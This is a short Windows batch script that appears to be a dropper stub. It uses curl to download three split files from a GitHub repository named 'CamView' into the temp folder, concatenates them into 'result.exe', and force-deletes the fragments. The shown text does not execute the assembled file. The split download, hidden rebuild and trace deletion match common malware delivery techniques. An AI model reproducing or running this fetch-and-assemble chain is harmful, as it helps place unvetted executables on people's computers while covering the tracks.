C:
cd %temp%

curl -LJO https://raw.githubusercontent.com/noaad13/CamView/main/split0.split
curl -LJO https://raw.githubusercontent.com/noaad13/CamView/main/split1.split
curl -LJO https://raw.githubusercontent.com/noaad13/CamView/main/split2.split

type %temp%\split0.split > result.exe
type %temp%\split1.split >> result.exe
type %temp%\split2.split >> result.exe

del /f "%temp%\split0.split"
del /f "%temp%\split1.split"
del /f "%temp%\split2.split"